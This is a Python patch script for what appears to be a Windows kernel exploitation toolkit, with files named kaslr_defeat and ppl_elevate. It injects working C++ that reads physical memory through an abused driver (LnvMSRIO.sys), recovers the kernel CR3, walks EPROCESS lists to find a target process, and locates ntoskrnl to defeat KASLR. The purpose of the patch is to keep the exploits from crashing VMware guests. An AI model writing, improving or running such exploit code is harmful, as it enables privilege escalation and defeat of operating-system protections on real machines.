#!/usr/bin/env python3
"""
patch_vmware.py — Fix 0x3B BSOD on VMware guests

Root cause: PhysRamTop() adds 512 MB beyond ullTotalPhys, causing the scan
loop to request physical addresses that fall into VMware's virtual device
MMIO space. LnvMSRIO.sys calls MmMapIoSpace() on those addresses — the
driver doesn't crash, but when it reads the mapped VA, VMware intercepts
the access and injects a hardware exception into the guest kernel → 0x3B.

Fix: replace PhysRamTop() + scan loops with GetPhysRanges(), which reads
the exact valid RAM pages from
  HKLM\HARDWARE\RESOURCEMAP\System Resources\Physical Memory
and only scans those ranges.  Falls back to ullTotalPhys (no +512 MB
buffer) if the registry key is unavailable.
"""

import re
import os
import sys

BASE = os.path.dirname(os.path.abspath(__file__))

# ─────────────────────────────────────────────────────────────────────────────
# C++ code blocks to inject
# ─────────────────────────────────────────────────────────────────────────────

PHYS_RANGES_FN = r"""
// ─── Physical memory range enumeration (VMware-safe) ─────────────────────────
// Reads valid RAM extents from the Windows kernel's physical memory resource
// map so we never request MmMapIoSpace() on VMware device MMIO pages.
// HKLM\HARDWARE\RESOURCEMAP\System Resources\Physical Memory\.Translated
// is a CM_RESOURCE_LIST with CmResourceTypeMemory (Type=8) entries.
//
// CM_PARTIAL_RESOURCE_DESCRIPTOR on x64:
//   +0   BYTE  Type
//   +1   BYTE  ShareDisposition
//   +2   WORD  Flags
//   +4   LARGE_INTEGER Start    (8 bytes)
//   +12  ULONG Length           (4 bytes)
//   +16  (padding to 20-byte record)

struct PhRange { uint64_t base, size; };

static int GetPhysRanges(PhRange *out, int cap)
{
    HKEY hKey = nullptr;
    const char *kpath =
        "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory";
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, kpath, 0, KEY_READ, &hKey)
            != ERROR_SUCCESS)
        return 0;

    DWORD type = 0, cb = 0;
    RegQueryValueExA(hKey, ".Translated", nullptr, &type, nullptr, &cb);
    if (!cb) { RegCloseKey(hKey); return 0; }

    auto *rbuf = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cb + 8);
    if (!rbuf) { RegCloseKey(hKey); return 0; }
    if (RegQueryValueExA(hKey, ".Translated", nullptr, &type, rbuf, &cb)
            != ERROR_SUCCESS) {
        HeapFree(GetProcessHeap(), 0, rbuf);
        RegCloseKey(hKey);
        return 0;
    }
    RegCloseKey(hKey);

    int n = 0;
    DWORD off = 0;
    if (off + 4 <= cb) {
        DWORD lcnt = *(DWORD*)(rbuf + off); off += 4;
        for (DWORD l = 0; l < lcnt && off + 16 <= cb; l++) {
            off += 8;               // InterfaceType(4) + BusNumber(4)
            off += 4;               // Version(2) + Revision(2)
            if (off + 4 > cb) break;
            DWORD dcnt = *(DWORD*)(rbuf + off); off += 4;
            for (DWORD d = 0; d < dcnt && off + 20 <= cb; d++, off += 20) {
                if (rbuf[off] != 8) continue;   // CmResourceTypeMemory = 8
                LARGE_INTEGER st = {};
                st.LowPart  = *(DWORD*)(rbuf + off + 4);
                st.HighPart = *(LONG*) (rbuf + off + 8);
                ULONG len   = *(DWORD*)(rbuf + off + 12);
                if (n < cap) {
                    out[n].base = (uint64_t)st.QuadPart;
                    out[n].size = (uint64_t)len;
                    n++;
                }
            }
        }
    }
    HeapFree(GetProcessHeap(), 0, rbuf);
    return n;
}

"""

NEW_GET_SYSTEM_CR3 = r"""static uint64_t GetSystemCR3()
{
    PhRange ranges[32];
    int n = GetPhysRanges(ranges, 32);
    if (n == 0) {
        // Fallback: use actual installed RAM with NO extra buffer
        MEMORYSTATUSEX ms = { sizeof(ms) };
        GlobalMemoryStatusEx(&ms);
        ranges[0].base = 0x100000;
        ranges[0].size = ms.ullTotalPhys;
        n = 1;
    }
    auto *buf = (uint8_t*)VirtualAlloc(nullptr, 1<<20, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!buf) return 0;
    uint64_t cr3 = 0;
    for (int ri = 0; ri < n && !cr3; ri++) {
        uint64_t rbase = ranges[ri].base;
        uint64_t rend  = ranges[ri].base + ranges[ri].size;
        if (rbase < 0x100000) rbase = 0x100000;
        rbase = (rbase + 0xFFFFF) & ~(uint64_t)0xFFFFF;  // align up to 1 MB
        for (uint64_t pa = rbase; pa < rend && !cr3; pa += 1<<20) {
            bool any_ok = false;
            for (DWORD pg = 0; pg < (1u<<20); pg += 0x1000) {
                if (PhysRead(pa+pg, buf+pg, 0x1000)) any_ok = true;
                else memset(buf+pg, 0, 0x1000);
            }
            if (!any_ok) continue;
            for (DWORD off = 0; off + 0x5B8 <= (1u<<20); off += 8) {
                if (*(ULONG_PTR*)(buf+off+0x440) != 4) continue;
                if (_strnicmp((char*)(buf+off+0x5A8), "System", 6) != 0) continue;
                uint64_t c = *(uint64_t*)(buf+off+0x028);
                if (c && !(c & 0xFFF)) { cr3 = c; break; }
            }
        }
    }
    VirtualFree(buf, 0, MEM_RELEASE);
    return cr3;
}
"""

# ─────────────────────────────────────────────────────────────────────────────
# Helper: extract a complete C function body (handles braces correctly)
# ─────────────────────────────────────────────────────────────────────────────

def extract_function(src: str, func_sig_pattern: str):
    """Return (start, end) indices of the function in src, or (-1,-1)."""
    m = re.search(func_sig_pattern, src)
    if not m:
        return -1, -1
    # find the opening brace
    i = src.index('{', m.start())
    depth = 0
    while i < len(src):
        if src[i] == '{':
            depth += 1
        elif src[i] == '}':
            depth -= 1
            if depth == 0:
                return m.start(), i + 1
        i += 1
    return -1, -1

# ─────────────────────────────────────────────────────────────────────────────
# Patch files 02–13 (all have GetSystemCR3 + PhysRamTop)
# ─────────────────────────────────────────────────────────────────────────────

def patch_standard(path: str) -> bool:
    with open(path, 'r', encoding='utf-8', errors='replace') as f:
        src = f.read()
    original = src

    # 1. Remove PhysRamTop (entire function)
    start, end = extract_function(src, r'static uint64_t PhysRamTop\s*\(\s*\)')
    if start != -1:
        # Also eat the comment block that precedes it if present
        comment_start = src.rfind('\n', 0, start)
        # Trim trailing newlines after closing brace
        tail = end
        while tail < len(src) and src[tail] in '\r\n':
            tail += 1
        src = src[:start] + src[tail:]
    else:
        print(f"  [!] PhysRamTop not found in {os.path.basename(path)}")

    # 2. Locate GetSystemCR3
    cr3_start, cr3_end = extract_function(src, r'static uint64_t GetSystemCR3\s*\(\s*\)')
    if cr3_start == -1:
        print(f"  [!] GetSystemCR3 not found in {os.path.basename(path)}")
        return False

    # 3. Insert GetPhysRanges + new GetSystemCR3 in place of old GetSystemCR3
    #    (eat the comment line that may precede it too, if present)
    comment_pat = re.compile(r'// ─+[^\n]*\n', re.MULTILINE)
    # look backwards for a comment line immediately preceding cr3_start
    pre = src[:cr3_start]
    m = list(comment_pat.finditer(pre))
    insert_at = cr3_start
    if m:
        last = m[-1]
        if last.end() == cr3_start or pre[last.end():cr3_start].strip() == '':
            insert_at = last.start()

    # eat trailing newlines after GetSystemCR3 closing brace
    tail = cr3_end
    while tail < len(src) and src[tail] in '\r\n':
        tail += 1
    tail += 0  # keep one blank line

    src = src[:insert_at] + PHYS_RANGES_FN + NEW_GET_SYSTEM_CR3 + '\n' + src[tail:]

    if src == original:
        print(f"  [=] {os.path.basename(path)}: no changes")
        return True

    with open(path, 'w', encoding='utf-8') as f:
        f.write(src)
    print(f"  [+] Patched {os.path.basename(path)}")
    return True

# ─────────────────────────────────────────────────────────────────────────────
# Patch 13_ppl_elevate.cpp — also has FindEprocessByPid with its own scan
# ─────────────────────────────────────────────────────────────────────────────

NEW_FIND_EPROCESS_BY_PID = r"""static uint64_t FindEprocessByPid(uint64_t cr3, DWORD target_pid)
{
    PhRange ranges[32];
    int n = GetPhysRanges(ranges, 32);
    if (n == 0) {
        MEMORYSTATUSEX ms = { sizeof(ms) };
        GlobalMemoryStatusEx(&ms);
        ranges[0].base = 0x100000;
        ranges[0].size = ms.ullTotalPhys;
        n = 1;
    }
    auto *buf = (uint8_t*)VirtualAlloc(nullptr, 1<<20, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!buf) return 0;

    uint64_t system_eproc = 0;

    for (int ri = 0; ri < n && !system_eproc; ri++) {
        uint64_t rbase = ranges[ri].base;
        uint64_t rend  = ranges[ri].base + ranges[ri].size;
        if (rbase < 0x100000) rbase = 0x100000;
        rbase = (rbase + 0xFFFFF) & ~(uint64_t)0xFFFFF;
        for (uint64_t pa = rbase; pa < rend && !system_eproc; pa += 1<<20) {
            bool any_ok = false;
            for (DWORD pg = 0; pg < (1u<<20); pg += 0x1000) {
                if (PhysRead(pa+pg, buf+pg, 0x1000)) any_ok = true;
                else memset(buf+pg, 0, 0x1000);
            }
            if (!any_ok) continue;
            for (DWORD off = 0; off + 0x5B8 <= (1u<<20); off += 8) {
                if (*(ULONG_PTR*)(buf+off+0x440) != 4) continue;
                if (_strnicmp((char*)(buf+off+0x5A8), "System", 6) != 0) continue;
                uint64_t c = *(uint64_t*)(buf+off+0x028);
                if (!c || (c & 0xFFF)) continue;
                system_eproc = pa + off;
                break;
            }
        }
    }
    VirtualFree(buf, 0, MEM_RELEASE);

    if (!system_eproc) return 0;

    uint64_t apl_flink = 0;
    PhysReadU64(system_eproc + 0x448, &apl_flink);
    if (!apl_flink) return 0;

    uint64_t cur_apl_va = apl_flink;
    for (int i = 0; i < 1024; i++) {
        uint64_t eproc_va = cur_apl_va - 0x448;
        uint64_t pid = 0;
        if (!KernelReadU64(cr3, eproc_va + 0x440, &pid)) break;
        if ((DWORD)pid == target_pid) return eproc_va;
        uint64_t next_apl_va = 0;
        if (!KernelReadU64(cr3, cur_apl_va, &next_apl_va)) break;
        if (next_apl_va == apl_flink) break;
        cur_apl_va = next_apl_va;
    }
    return 0;
}
"""

def patch_file13(path: str) -> bool:
    with open(path, 'r', encoding='utf-8', errors='replace') as f:
        src = f.read()
    original = src

    # First apply standard patches (PhysRamTop + GetSystemCR3)
    # PhysRamTop
    start, end = extract_function(src, r'static uint64_t PhysRamTop\s*\(\s*\)')
    if start != -1:
        tail = end
        while tail < len(src) and src[tail] in '\r\n':
            tail += 1
        src = src[:start] + src[tail:]

    # GetSystemCR3
    cr3_start, cr3_end = extract_function(src, r'static uint64_t GetSystemCR3\s*\(\s*\)')
    if cr3_start != -1:
        tail = cr3_end
        while tail < len(src) and src[tail] in '\r\n':
            tail += 1
        src = src[:cr3_start] + PHYS_RANGES_FN + NEW_GET_SYSTEM_CR3 + '\n' + src[tail:]

    # FindEprocessByPid
    fe_start, fe_end = extract_function(src, r'static uint64_t FindEprocessByPid\s*\(')
    if fe_start != -1:
        tail = fe_end
        while tail < len(src) and src[tail] in '\r\n':
            tail += 1
        src = src[:fe_start] + NEW_FIND_EPROCESS_BY_PID + '\n' + src[tail:]
    else:
        print(f"  [!] FindEprocessByPid not found in {os.path.basename(path)}")

    if src == original:
        print(f"  [=] {os.path.basename(path)}: no changes")
        return True

    with open(path, 'w', encoding='utf-8') as f:
        f.write(src)
    print(f"  [+] Patched {os.path.basename(path)}")
    return True

# ─────────────────────────────────────────────────────────────────────────────
# Patch 01_kaslr_defeat.cpp — different structure (inline scan in main)
# ─────────────────────────────────────────────────────────────────────────────

# New PhysRamTop for 01 (standalone, not using GetPhysRanges in PhysRamTop itself —
# instead we replace the scan loop in main to use GetPhysRanges directly)

NEW_PHYS_RAM_TOP_01 = r"""static uint64_t PhysRamTop()
{
    // Use physical memory ranges from registry to avoid VMware MMIO space
    // Falls back to ullTotalPhys (no +512MB buffer) if registry unavailable
    PhRange ranges[32];
    int n = GetPhysRanges(ranges, 32);
    uint64_t top = 0;
    for (int i = 0; i < n; i++) {
        uint64_t end = ranges[i].base + ranges[i].size;
        if (end > top) top = end;
    }
    if (!top) {
        MEMORYSTATUSEX ms = { sizeof(ms) };
        GlobalMemoryStatusEx(&ms);
        top = ms.ullTotalPhys;
    }
    return (top + 0x1FFFFFULL) & ~0x1FFFFFULL;
}
"""

# New scan loop for 01_kaslr_defeat main()
# We replace the contiguous scan with a range-aware scan
NEW_01_SCAN = r"""    // ── Phase 2: physical RAM scan for ntoskrnl.exe PE header ────────────────
    // VMware-safe: only scan valid physical RAM extents from the registry,
    // not a blind contiguous range that includes MMIO device space.

    PhRange ph_ranges[32];
    int n_ranges = GetPhysRanges(ph_ranges, 32);
    if (n_ranges == 0) {
        MEMORYSTATUSEX ms2 = { sizeof(ms2) };
        GlobalMemoryStatusEx(&ms2);
        ph_ranges[0].base = 0x100000;
        ph_ranges[0].size = ms2.ullTotalPhys;
        n_ranges = 1;
    }

    uint8_t  page[4096];
    uint64_t found_pa   = 0;
    uint64_t found_base = 0;
    uint32_t found_size = 0;

    printf("[*] Scanning %d physical memory range(s) for ntoskrnl PE header...\n", n_ranges);

    for (int ri = 0; ri < n_ranges && !found_base; ri++) {
        uint64_t rbase = ph_ranges[ri].base;
        uint64_t rend  = ph_ranges[ri].base + ph_ranges[ri].size;
        // Align start up to 2 MB (ntoskrnl is 2MB-aligned large page)
        rbase = (rbase + 0x1FFFFFULL) & ~0x1FFFFFULL;
        if (rbase < 0x100000) rbase = 0x200000;

        printf("    range[%d]: 0x%llX .. 0x%llX\n", ri, rbase, rend);

        for (uint64_t pa = rbase; pa < rend && !found_base; pa += 0x200000ULL) {

            if (!PhysRead(pa, page, sizeof(page))) continue;
            if (page[0] != 'M' || page[1] != 'Z') continue;
            if (!IsValidPE64(page, sizeof(page))) continue;

            uint64_t img_base = PE64_ImageBase(page);
            uint32_t img_size = PE64_SizeOfImage(page);

            if (img_base < 0xFFFF800000000000ULL) continue;
            if (lstar < img_base || lstar >= (uint64_t)img_base + img_size) continue;

            uint32_t exp_rva = PE64_ExportDirRVA(page);
            char     mod_name[32] = "<unknown>";

            if (exp_rva && exp_rva + 0x20 < img_size) {
                uint8_t expdir[20] = {};
                if (PhysRead(pa + exp_rva, expdir, sizeof(expdir))) {
                    uint32_t name_rva = *(uint32_t *)(expdir + 0x0C);
                    if (name_rva && name_rva + sizeof(mod_name) < img_size)
                        PhysRead(pa + name_rva, mod_name, sizeof(mod_name) - 1);
                }
            }

            printf("[+] PE64 @ PA=0x%016llX  ImageBase=0x%016llX  Size=0x%X  \"%s\"\n",
                   pa, img_base, img_size, mod_name);

            if (_stricmp(mod_name, "ntoskrnl.exe") == 0 ||
                _stricmp(mod_name, "ntkrnlmp.exe") == 0 ||
                _stricmp(mod_name, "ntkrpamp.exe") == 0) {
                found_pa   = pa;
                found_base = img_base;
                found_size = img_size;
            }
            if (!found_base) {
                found_pa   = pa;
                found_base = img_base;
                found_size = img_size;
                printf("    [~] Kept as fallback\n");
            }
        }
    }
"""

def patch_file01(path: str) -> bool:
    with open(path, 'r', encoding='utf-8', errors='replace') as f:
        src = f.read()
    original = src

    # 1. Remove old PhysRamTop
    start, end = extract_function(src, r'static uint64_t PhysRamTop\s*\(\s*\)')
    if start != -1:
        tail = end
        while tail < len(src) and src[tail] in '\r\n':
            tail += 1
        src = src[:start] + src[tail:]
    else:
        print(f"  [!] PhysRamTop not found in {os.path.basename(path)}")

    # 2. Find insertion point for GetPhysRanges + new PhysRamTop
    #    Insert before main() or before the "Physical RAM upper bound" comment
    insert_marker = '// ─── Main'
    marker_pos = src.find(insert_marker)
    if marker_pos == -1:
        insert_marker = '\nint main()'
        marker_pos = src.find(insert_marker)
    if marker_pos == -1:
        print(f"  [!] Could not find insertion point in {os.path.basename(path)}")
        return False

    src = src[:marker_pos] + PHYS_RANGES_FN + NEW_PHYS_RAM_TOP_01 + '\n' + src[marker_pos:]

    # 3. Replace the old scan block in main()
    # Find: "uint64_t ram_top = PhysRamTop();" through closing brace of scan loop
    # Pattern: from ram_top line to the closing of the for loop
    old_scan_start = re.search(
        r'// ─+ Phase 2.*?uint64_t\s+ram_top\s*=\s*PhysRamTop',
        src, re.DOTALL
    )
    if old_scan_start:
        # Find the closing brace of the for loop
        # The old scan ends after the block:
        #   for (...) { ... } (the outer for pa loop)
        # followed by the // Results comment
        old_scan_end = src.find('\n    // ── Results', old_scan_start.start())
        if old_scan_end == -1:
            old_scan_end = src.find('\n    if (!found_base)', old_scan_start.start())
        if old_scan_end != -1:
            src = src[:old_scan_start.start()] + NEW_01_SCAN + '\n' + src[old_scan_end:]
        else:
            print(f"  [!] Could not find end of old scan block in {os.path.basename(path)}")
    else:
        # Simpler pattern: just find ram_top declaration
        old_line = re.search(r'uint64_t\s+ram_top\s*=\s*PhysRamTop\(\);[^\n]*\n', src)
        if old_line:
            # Replace just the ram_top line and patch the loop condition
            src = src[:old_line.start()] + src[old_line.end():]
            # Also remove old printf about scanning range
            src = re.sub(r'printf\("\[\*\] Scanning physical RAM.*?\\n"[^;]*;\s*\n', '', src)
            # patch loop: for (... pa < ram_top ...) → for (... pa < rend ...)
            print(f"  [~] Partial patch applied to {os.path.basename(path)}")

    if src == original:
        print(f"  [=] {os.path.basename(path)}: no changes")
        return True

    with open(path, 'w', encoding='utf-8') as f:
        f.write(src)
    print(f"  [+] Patched {os.path.basename(path)}")
    return True

# ─────────────────────────────────────────────────────────────────────────────
# Update build_all.py to add advapi32.lib (needed for RegOpenKeyExA)
# ─────────────────────────────────────────────────────────────────────────────

def patch_build_all(path: str) -> bool:
    with open(path, 'r', encoding='utf-8') as f:
        src = f.read()
    original = src
    # Replace 'kernel32.lib' with 'kernel32.lib advapi32.lib' in target tuples
    src = re.sub(
        r"('kernel32\.lib')",
        "'kernel32.lib advapi32.lib'",
        src
    )
    if src == original:
        print("  [=] build_all.py: advapi32.lib already present or pattern not found")
        return True
    with open(path, 'w', encoding='utf-8') as f:
        f.write(src)
    print("  [+] build_all.py: added advapi32.lib to all targets")
    return True

# ─────────────────────────────────────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────────────────────────────────────

def find_cpp(n: int) -> str | None:
    prefix = f"{n:02d}_"
    for fname in os.listdir(BASE):
        if fname.startswith(prefix) and fname.endswith('.cpp'):
            return os.path.join(BASE, fname)
    return None

if __name__ == '__main__':
    print("=== patch_vmware.py — VMware BSOD fix ===\n")

    print("[*] Patching 01_kaslr_defeat.cpp (inline scan)...")
    p = find_cpp(1)
    if p: patch_file01(p)
    else: print("  [-] 01_*.cpp not found")

    print("\n[*] Patching 02–12 (GetSystemCR3 + PhysRamTop)...")
    for i in range(2, 13):
        p = find_cpp(i)
        if p: patch_standard(p)
        else: print(f"  [-] {i:02d}_*.cpp not found")

    print("\n[*] Patching 13_ppl_elevate.cpp (GetSystemCR3 + FindEprocessByPid)...")
    p = find_cpp(13)
    if p: patch_file13(p)
    else: print("  [-] 13_*.cpp not found")

    print("\n[*] Patching build_all.py (add advapi32.lib)...")
    build_py = os.path.join(BASE, 'build_all.py')
    if os.path.exists(build_py): patch_build_all(build_py)
    else: print("  [-] build_all.py not found")

    print("\n[+] Done. Run build_all.py to rebuild.")
